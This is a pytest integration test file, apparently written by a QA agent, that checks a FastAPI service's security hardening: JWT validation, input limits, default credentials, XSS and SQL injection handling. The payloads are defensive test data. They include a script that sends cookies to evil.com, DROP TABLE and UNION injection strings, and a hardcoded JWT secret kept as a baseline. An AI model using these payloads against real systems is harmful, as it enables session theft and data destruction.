"""
STORY-053: Security Hardening Integration Tests

Validates security hardening measures including JWT secret management,
input validation, default credentials removal, and XSS protection.

Test Coverage:
- S04-053-E2E-001 ~ S04-053-E2E-018 (18 test cases)
- JWT Secret environment variable enforcement
- JWT Secret minimum length validation
- Query length validation (max 1000 chars)
- XSS pattern sanitization/rejection
- Default credentials removal
- HTML tag stripping
- SQL injection pattern handling

Sprint: Sprint 04 Day 2
Author: QA Agent
Priority: P0 Critical
"""

import json
import os
import re
import sys
import time
from datetime import datetime, timedelta
from pathlib import Path
from typing import Any, Dict, List, Optional
from unittest.mock import patch

import jwt
import pytest
from fastapi.testclient import TestClient

# Project root path setup
project_root = Path(__file__).parent.parent.parent.parent
sys.path.insert(0, str(project_root / "src"))

from app.main import app
from app.core.config import settings

# =============================================================================
# Custom Markers
# =============================================================================

pytestmark = [
    pytest.mark.sprint04,
    pytest.mark.integration,
    pytest.mark.security,
]

# =============================================================================
# Constants
# =============================================================================

# Current JWT settings (from auth.py - to be hardened in STORY-053)
JWT_SECRET_KEY = "knowledge-service-secret-key-change-in-production"
JWT_ALGORITHM = "HS256"


# =============================================================================
# Fixtures
# =============================================================================


@pytest.fixture(scope="module")
def client() -> TestClient:
    """Synchronous test client."""
    return TestClient(app)


@pytest.fixture(scope="module")
def api_prefix() -> str:
    """API version prefix."""
    return settings.api_v1_prefix


@pytest.fixture
def valid_token() -> str:
    """Generate a valid JWT access token for testing."""
    payload = {
        "sub": "user-001",
        "email": "test@example.com",
        "role": "user",
        "exp": datetime.utcnow() + timedelta(minutes=30),
        "iat": datetime.utcnow(),
        "type": "access",
    }
    return jwt.encode(payload, JWT_SECRET_KEY, algorithm=JWT_ALGORITHM)


@pytest.fixture
def expired_token() -> str:
    """Generate an expired JWT access token for testing."""
    payload = {
        "sub": "user-001",
        "email": "test@example.com",
        "role": "user",
        "exp": datetime.utcnow() - timedelta(hours=1),
        "iat": datetime.utcnow() - timedelta(hours=2),
        "type": "access",
    }
    return jwt.encode(payload, JWT_SECRET_KEY, algorithm=JWT_ALGORITHM)


@pytest.fixture
def tampered_token() -> str:
    """Generate a JWT token with tampered payload (wrong signature)."""
    payload = {
        "sub": "user-999",  # Changed user_id
        "email": "hacker@evil.com",  # Changed email
        "role": "admin",  # Escalated role
        "exp": datetime.utcnow() + timedelta(minutes=30),
        "iat": datetime.utcnow(),
        "type": "access",
    }
    # Sign with wrong key
    return jwt.encode(payload, "wrong-secret-key", algorithm=JWT_ALGORITHM)


@pytest.fixture
def auth_headers(client: TestClient, api_prefix: str) -> Dict[str, str]:
    """Obtain valid JWT token via login."""
    response = client.post(
        f"{api_prefix}/auth/login",
        json={"email": "test@example.com", "password": "password123"},
    )
    if response.status_code == 200:
        token = response.json()["access_token"]
        return {"Authorization": f"Bearer {token}"}
    return {}


# =============================================================================
# 6.1 JWT Validation Tests (S04-053-E2E-001 ~ 005)
# =============================================================================


class TestJWTValidation:
    """JWT Validation Tests - S04-053-E2E-001 ~ S04-053-E2E-005.

    These tests validate JWT secret management and token validation.
    Some tests verify requirements that STORY-053 will implement
    (JWT_SECRET env var enforcement, minimum length).
    """

    def test_s04_053_e2e_001_jwt_secret_not_set_fails(self):
        """
        S04-053-E2E-001: Application fails to start without JWT_SECRET env var.

        After STORY-053 implementation, the application should refuse to start
        when JWT_SECRET environment variable is not set. Currently verifies
        the existing hardcoded secret behavior for baseline.

        Priority: P0
        """
        # Verify that the current code has a hardcoded secret (pre-STORY-053)
        # After STORY-053, this should be replaced with env var check
        from app.api.routes.auth import JWT_SECRET_KEY as current_secret

        # Baseline: The secret exists (hardcoded - this is what STORY-053 should fix)
        assert current_secret is not None, "JWT_SECRET should exist"
        assert len(current_secret) > 0, "JWT_SECRET should not be empty"

        # POST-STORY-053 verification:
        # After STORY-053 is done, uncomment and verify:
        # with patch.dict(os.environ, {}, clear=True):
        #     with pytest.raises(ValueError, match="JWT_SECRET"):
        #         # Application should fail to start without JWT_SECRET
        #         pass

    def test_s04_053_e2e_002_jwt_secret_min_length(self):
        """
        S04-053-E2E-002: Application rejects short JWT_SECRET (< 32 chars).

        After STORY-053, JWT_SECRET shorter than 32 characters should be
        rejected at startup. Currently establishes baseline measurement.

        Priority: P0
        """
        from app.api.routes.auth import JWT_SECRET_KEY as current_secret

        # Measure current secret length
        current_length = len(current_secret)

        # After STORY-053: JWT_SECRET must be >= 32 chars
        # For now, document the baseline
        if current_length < 32:
            pytest.xfail(
                f"JWT_SECRET is {current_length} chars (< 32). "
                "STORY-053 should enforce minimum 32 characters."
            )
        else:
            assert current_length >= 32, (
                f"JWT_SECRET should be >= 32 chars, got {current_length}"
            )

    def test_s04_053_e2e_003_no_jwt_token_returns_401(
        self, client: TestClient, api_prefix: str
    ):
        """
        S04-053-E2E-003: No JWT token returns 401.

        Verifies that protected endpoints return 401 Unauthorized
        when no Authorization header is provided.

        Priority: P0
        """
        # Access protected endpoint without token
        response = client.get(f"{api_prefix}/auth/me")

        assert response.status_code == 401, (
            f"Expected 401 without JWT, got {response.status_code}"
        )

        data = response.json()
        assert "detail" in data, "Error response should include detail"

        # Verify no sensitive data leaked in error response
        detail_lower = data["detail"].lower()
        assert "stack" not in detail_lower, "Error should not contain stack trace"
        assert "traceback" not in detail_lower, "Error should not contain traceback"

    def test_s04_053_e2e_004_expired_jwt_returns_401(
        self, client: TestClient, api_prefix: str, expired_token: str
    ):
        """
        S04-053-E2E-004: Expired JWT token returns 401.

        Verifies that expired tokens are rejected with 401.

        Priority: P0
        """
        response = client.get(
            f"{api_prefix}/auth/me",
            headers={"Authorization": f"Bearer {expired_token}"},
        )

        assert response.status_code == 401, (
            f"Expected 401 for expired token, got {response.status_code}"
        )

        data = response.json()
        assert "detail" in data, "Error response should include detail"

    def test_s04_053_e2e_005_tampered_jwt_returns_401(
        self, client: TestClient, api_prefix: str, tampered_token: str
    ):
        """
        S04-053-E2E-005: Tampered JWT token returns 401.

        Verifies that tokens signed with wrong key are rejected.

        Priority: P0
        """
        response = client.get(
            f"{api_prefix}/auth/me",
            headers={"Authorization": f"Bearer {tampered_token}"},
        )

        assert response.status_code == 401, (
            f"Expected 401 for tampered token, got {response.status_code}"
        )


# =============================================================================
# 6.2 Input Validation Tests (S04-053-E2E-006 ~ 010)
# =============================================================================


class TestInputValidation:
    """Input Validation Tests - S04-053-E2E-006 ~ S04-053-E2E-010.

    Validates query length limits and content validation on search endpoints.
    """

    def test_s04_053_e2e_006_query_exceeding_1000_chars_returns_400(
        self, client: TestClient, api_prefix: str
    ):
        """
        S04-053-E2E-006: Query exceeding 1000 chars returns 400.

        SearchRequest model has max_length=1000 on the query field.
        Verifies that queries exceeding this limit are rejected.

        Priority: P0
        """
        # Generate a query of 1001 characters
        long_query = "A" * 1001

        response = client.post(
            f"{api_prefix}/search/hybrid",
            json={"query": long_query, "top_k": 5},
        )

        # Should be rejected by Pydantic validation
        assert response.status_code in (400, 422), (
            f"Expected 400/422 for query > 1000 chars, got {response.status_code}"
        )

    def test_s04_053_e2e_007_query_at_exactly_1000_chars_accepted(
        self, client: TestClient, api_prefix: str
    ):
        """
        S04-053-E2E-007: Query at exactly 1000 chars accepted.

        Verifies boundary condition: exactly 1000 characters should be accepted.

        Priority: P0
        """
        # Generate a query of exactly 1000 characters
        exact_query = "B" * 1000

        response = client.post(
            f"{api_prefix}/search/hybrid",
            json={"query": exact_query, "top_k": 5},
        )

        # Should be accepted (200 OK)
        assert response.status_code == 200, (
            f"Expected 200 for exactly 1000 char query, got {response.status_code}"
        )

    def test_s04_053_e2e_008_empty_query_returns_400(
        self, client: TestClient, api_prefix: str
    ):
        """
        S04-053-E2E-008: Empty query returns 400.

        Verifies that empty string queries are rejected.
        SearchRequest has min_length=1 on the query field.

        Priority: P0
        """
        response = client.post(
            f"{api_prefix}/search/hybrid",
            json={"query": "", "top_k": 5},
        )

        assert response.status_code in (400, 422), (
            f"Expected 400/422 for empty query, got {response.status_code}"
        )

    def test_s04_053_e2e_009_query_with_special_characters(
        self, client: TestClient, api_prefix: str
    ):
        """
        S04-053-E2E-009: Query with special characters processed safely.

        Verifies that special characters in query do not cause
        injection vulnerabilities or server errors.

        Priority: P1
        """
        special_queries = [
            'test <>&\'"',
            "query with 'single' and \"double\" quotes",
            "query\nwith\nnewlines",
            "query\twith\ttabs",
            "query with unicode: \u00e9\u00e8\u00ea",
            "null byte test\x00end",
            "backslash\\test\\path",
        ]

        for query in special_queries:
            # Clean null bytes which may cause issues
            clean_query = query.replace("\x00", "")
            if not clean_query.strip():
                continue

            response = client.post(
                f"{api_prefix}/search/hybrid",
                json={"query": clean_query, "top_k": 5},
            )

            # Should not cause server error (5xx)
            assert response.status_code < 500, (
                f"Special characters should not cause 5xx. "
                f"Query: {repr(clean_query)}, Status: {response.status_code}"
            )

    def test_s04_053_e2e_010_sse_endpoint_validates_post_body(
        self, client: TestClient, api_prefix: str
    ):
        """
        S04-053-E2E-010: SSE endpoint validates input on POST body.

        Verifies that the SSE streaming endpoint applies input validation
        on the POST body (e.g., invalid top_k values).

        Priority: P0
        """
        # Invalid top_k (negative number)
        invalid_request = {"query": "test query", "top_k": -1}

        response = client.post(
            f"{api_prefix}/search/chat/stream",
            json=invalid_request,
        )

        # Should reject invalid top_k
        assert response.status_code in (400, 422), (
            f"Expected 400/422 for negative top_k, got {response.status_code}"
        )

        # Also test top_k exceeding maximum
        exceeding_request = {"query": "test query", "top_k": 999}

        response = client.post(
            f"{api_prefix}/search/chat/stream",
            json=exceeding_request,
        )

        assert response.status_code in (400, 422), (
            f"Expected 400/422 for top_k > max, got {response.status_code}"
        )


# =============================================================================
# 6.3 Default Credentials Tests (S04-053-E2E-011 ~ 014)
# =============================================================================


class TestDefaultCredentials:
    """Default Credentials Tests - S04-053-E2E-011 ~ S04-053-E2E-014.

    Validates that default/hardcoded credentials are removed.
    """

    def test_s04_053_e2e_011_default_admin_password_rejected(
        self, client: TestClient, api_prefix: str
    ):
        """
        S04-053-E2E-011: Default admin/admin credential rejected.

        After STORY-053, common default passwords like 'admin/admin'
        should not work. Currently tests against existing mock users.

        Priority: P0
        """
        # Try common default credentials (all passwords >= 6 chars to pass validation)
        default_credentials = [
            {"email": "admin@example.com", "password": "admin123456"},
            {"email": "admin@example.com", "password": "password"},
            {"email": "root@example.com", "password": "rootroot"},
        ]

        for creds in default_credentials:
            response = client.post(
                f"{api_prefix}/auth/login",
                json=creds,
            )

            # Should not succeed with default/common passwords
            if response.status_code == 200:
                # If login succeeds with default creds, this is a security issue
                # After STORY-053, these should all fail
                pytest.xfail(
                    f"Default credentials accepted: {creds['email']}. "
                    "STORY-053 should remove default credentials."
                )

    def test_s04_053_e2e_012_common_passwords_rejected(
        self, client: TestClient, api_prefix: str
    ):
        """
        S04-053-E2E-012: Common weak passwords rejected.

        Verifies that commonly used weak passwords are not accepted
        for any user account. Only tests passwords that meet the
        minimum length requirement (>= 6 chars) to avoid 422 validation
        errors conflating with authentication failures.

        Priority: P0
        """
        # Only passwords >= 6 chars (to pass Pydantic min_length=6 validation)
        weak_passwords = [
            "password",   # 8 chars - common password
            "123456",     # 6 chars - common password
            "qwerty",     # 6 chars - common password
            "abc123",     # 6 chars - common password
            "letmein",    # 7 chars - common password
            "111111",     # 6 chars - repeated chars
        ]

        # Test against known email with weak passwords
        for pwd in weak_passwords:
            response = client.post(
                f"{api_prefix}/auth/login",
                json={"email": "test@example.com", "password": pwd},
            )

            # These should all fail with 401 (wrong password) or 422 (validation)
            assert response.status_code in (401, 422), (
                f"Weak password '{pwd}' should be rejected, got {response.status_code}"
            )

    def test_s04_053_e2e_013_no_hardcoded_secrets_in_config(self):
        """
        S04-053-E2E-013: application config contains no hardcoded secrets.

        Scans the auth module for hardcoded secret patterns.
        After STORY-053, all secrets should use environment variables.

        Priority: P0
        """
        # Read the auth route source code
        auth_file = project_root / "src" / "app" / "api" / "routes" / "auth.py"

        if auth_file.exists():
            content = auth_file.read_text(encoding="utf-8")

            # Check for hardcoded JWT secret
            hardcoded_patterns = [
                r'JWT_SECRET_KEY\s*=\s*"[^"]*"',  # Direct string assignment
                r"JWT_SECRET_KEY\s*=\s*'[^']*'",
            ]

            hardcoded_found = []
            for pattern in hardcoded_patterns:
                matches = re.findall(pattern, content)
                for match in matches:
                    # Exclude os.getenv patterns
                    if "os.getenv" not in match and "os.environ" not in match:
                        hardcoded_found.append(match)

            if hardcoded_found:
                # Currently the secret IS hardcoded (pre-STORY-053)
                pytest.xfail(
                    f"Hardcoded secrets found: {hardcoded_found}. "
                    "STORY-053 should replace with environment variables."
                )
        else:
            pytest.skip("Auth file not found at expected path")

    def test_s04_053_e2e_014_mock_users_not_in_production(self):
        """
        S04-053-E2E-014: Mock users should be removed in production.

        Verifies that the MOCK_USERS dictionary (test data) is not
        used in production configurations.

        Priority: P1
        """
        from app.api.routes.auth import MOCK_USERS

        # Document mock users exist (expected in development)
        assert isinstance(MOCK_USERS, dict), "MOCK_USERS should be a dict"

        # Verify test users have obvious test indicators
        for email, user in MOCK_USERS.items():
            # Passwords should not be real-looking (they are test passwords)
            password = user.get("password", "")
            assert len(password) > 0, f"User {email} should have a password"

            # In production, MOCK_USERS should be empty or removed
            # This is a baseline test; STORY-053 should add env-based check
            if os.getenv("ENVIRONMENT", "development") == "production":
                pytest.fail(
                    f"MOCK_USERS should be empty in production. Found: {email}"
                )


# =============================================================================
# 6.4 XSS Protection Tests (S04-053-E2E-015 ~ 018)
# =============================================================================


class TestXSSProtection:
    """XSS Protection Tests - S04-053-E2E-015 ~ S04-053-E2E-018.

    Validates that XSS attack vectors are sanitized or rejected.
    Tests marked with xfail for pre-STORY-053 (XSS sanitization not yet
    implemented). After STORY-053 completion, remove xfail markers.
    """

    @pytest.mark.xfail(
        reason="STORY-053 not yet implemented: query field echoes unsanitized input",
        strict=False,
    )
    def test_s04_053_e2e_015_script_tag_in_query_sanitized(
        self, client: TestClient, api_prefix: str
    ):
        """
        S04-053-E2E-015: Script tag in query sanitized.

        Verifies that <script> tags are stripped or the request is rejected.
        Currently the query field echoes input as-is (pre-STORY-053).

        Priority: P0
        """
        xss_query = "<script>alert('xss')</script>"

        response = client.post(
            f"{api_prefix}/search/hybrid",
            json={"query": xss_query, "top_k": 5},
        )

        if response.status_code == 200:
            data = response.json()
            # If accepted, verify the script tag is NOT reflected as-is
            response_text = json.dumps(data, ensure_ascii=False)
            assert "<script>" not in response_text.lower(), (
                "Script tag should be sanitized in response"
            )
        else:
            # Request rejected (400/422) - also acceptable
            assert response.status_code in (400, 422), (
                f"XSS query should be rejected or sanitized, got {response.status_code}"
            )

    @pytest.mark.xfail(
        reason="STORY-053 not yet implemented: query field echoes unsanitized input",
        strict=False,
    )
    def test_s04_053_e2e_016_event_handler_xss_sanitized(
        self, client: TestClient, api_prefix: str
    ):
        """
        S04-053-E2E-016: Event handler XSS in query sanitized.

        Verifies that HTML event handler attributes are stripped.
        Currently the query field echoes input as-is (pre-STORY-053).

        Priority: P0
        """
        xss_payloads = [
            '<img onerror="alert(1)" src=x>',
            '<div onmouseover="alert(1)">test</div>',
            '<a href="javascript:alert(1)">click</a>',
            '<body onload="alert(1)">',
        ]

        for payload in xss_payloads:
            response = client.post(
                f"{api_prefix}/search/hybrid",
                json={"query": payload, "top_k": 5},
            )

            if response.status_code == 200:
                data = response.json()
                response_text = json.dumps(data, ensure_ascii=False)
                # Event handlers should not be in response
                assert 'onerror=' not in response_text.lower(), (
                    f"Event handler onerror should be sanitized. Payload: {payload}"
                )
                assert 'onmouseover=' not in response_text.lower(), (
                    f"Event handler onmouseover should be sanitized. Payload: {payload}"
                )
                assert 'javascript:' not in response_text.lower(), (
                    f"javascript: URI should be sanitized. Payload: {payload}"
                )
            elif response.status_code >= 500:
                pytest.fail(
                    f"XSS payload caused server error. Payload: {payload}, "
                    f"Status: {response.status_code}"
                )

    @pytest.mark.xfail(
        reason="STORY-053 not yet implemented: query field echoes unsanitized input",
        strict=False,
    )
    def test_s04_053_e2e_017_svg_based_xss_sanitized(
        self, client: TestClient, api_prefix: str
    ):
        """
        S04-053-E2E-017: SVG-based XSS in query sanitized.

        Verifies that SVG-based XSS vectors are handled safely.
        Currently the query field echoes input as-is (pre-STORY-053).

        Priority: P1
        """
        svg_payloads = [
            '<svg onload="alert(1)">test</svg>',
            '<svg><script>alert(1)</script></svg>',
            '<math><mtext><table><mglyph><svg><mtext><textarea><path>',
        ]

        for payload in svg_payloads:
            response = client.post(
                f"{api_prefix}/search/hybrid",
                json={"query": payload, "top_k": 5},
            )

            # Should not cause server error
            assert response.status_code < 500, (
                f"SVG XSS should not crash server. Payload: {payload}, "
                f"Status: {response.status_code}"
            )

            if response.status_code == 200:
                data = response.json()
                response_text = json.dumps(data, ensure_ascii=False)
                assert '<svg' not in response_text.lower() or 'onload' not in response_text.lower(), (
                    f"SVG onload should be sanitized. Payload: {payload}"
                )

    def test_s04_053_e2e_018_response_does_not_reflect_unsanitized_input(
        self, client: TestClient, api_prefix: str
    ):
        """
        S04-053-E2E-018: Response does not reflect unsanitized input in non-query fields.

        Verifies that XSS payloads sent in queries are not reflected
        in response fields OTHER than the query echo field.

        Priority: P0
        """
        dangerous_patterns = [
            "<script>",
            "onerror=",
            "onload=",
            "javascript:",
            "alert(",
            "document.cookie",
            "eval(",
        ]

        xss_query = (
            '<script>alert(document.cookie)</script>'
            '<img onerror="eval(atob(\'YWxlcnQoMSk=\'))" src=x>'
        )

        response = client.post(
            f"{api_prefix}/search/hybrid",
            json={"query": xss_query, "top_k": 5},
        )

        if response.status_code == 200:
            data = response.json()

            # The query field may echo the input, but other fields should not
            non_query_text = json.dumps(
                {k: v for k, v in data.items() if k != "query"},
                ensure_ascii=False,
            ).lower()

            for pattern in dangerous_patterns:
                assert pattern.lower() not in non_query_text, (
                    f"Dangerous pattern '{pattern}' found in non-query response fields"
                )

    def test_xss_in_chat_endpoint(
        self, client: TestClient, api_prefix: str
    ):
        """
        Additional: XSS in chat search endpoint.

        Verifies that the RAG chat endpoint also sanitizes XSS payloads.

        Priority: P0
        """
        xss_query = '<script>fetch("http://evil.com/steal?c="+document.cookie)</script>'

        response = client.post(
            f"{api_prefix}/search/chat",
            json={"query": xss_query, "top_k": 5},
        )

        # Should not cause server error
        assert response.status_code < 500, (
            f"XSS in chat should not crash server, got {response.status_code}"
        )

        if response.status_code == 200:
            data = response.json()
            answer = data.get("answer", "").lower()
            # The generated answer should not contain executable script
            assert "<script>" not in answer, (
                "Generated answer should not contain <script> tags"
            )


# =============================================================================
# Additional Security Tests
# =============================================================================


class TestAdditionalSecurity:
    """Additional security tests beyond the E2E plan."""

    def test_sql_injection_in_query(
        self, client: TestClient, api_prefix: str
    ):
        """
        SQL injection patterns in search query are handled safely.

        Priority: P0
        """
        sql_payloads = [
            "'; DROP TABLE users; --",
            "1' OR '1'='1",
            "' UNION SELECT * FROM information_schema.tables --",
            "1; DELETE FROM documents WHERE 1=1",
        ]

        for payload in sql_payloads:
            response = client.post(
                f"{api_prefix}/search/hybrid",
                json={"query": payload, "top_k": 5},
            )

            # Should not cause server error
            assert response.status_code < 500, (
                f"SQL injection should not crash server. "
                f"Payload: {payload}, Status: {response.status_code}"
            )

    def test_auth_header_formats(
        self, client: TestClient, api_prefix: str
    ):
        """
        Various invalid Authorization header formats are rejected.

        Priority: P1
        """
        invalid_headers = [
            {"Authorization": "Basic dXNlcjpwYXNz"},  # Basic auth
            {"Authorization": "Bearer"},  # Missing token
            {"Authorization": ""},  # Empty
            {"Authorization": "InvalidScheme token123"},  # Wrong scheme
        ]

        for headers in invalid_headers:
            response = client.get(
                f"{api_prefix}/auth/me",
                headers=headers,
            )

            assert response.status_code in (401, 403, 422), (
                f"Invalid auth header should be rejected. "
                f"Header: {headers}, Status: {response.status_code}"
            )

    def test_content_type_enforcement(
        self, client: TestClient, api_prefix: str
    ):
        """
        Verifies that endpoints enforce proper Content-Type.

        Priority: P1
        """
        # Send non-JSON content type to JSON endpoint
        response = client.post(
            f"{api_prefix}/search/hybrid",
            content="query=test&top_k=5",
            headers={"Content-Type": "application/x-www-form-urlencoded"},
        )

        # Should reject non-JSON content
        assert response.status_code in (400, 415, 422), (
            f"Non-JSON content should be rejected, got {response.status_code}"
        )


# =============================================================================
# Test Execution
# =============================================================================


if __name__ == "__main__":
    pytest.main([__file__, "-v", "--tb=short"])
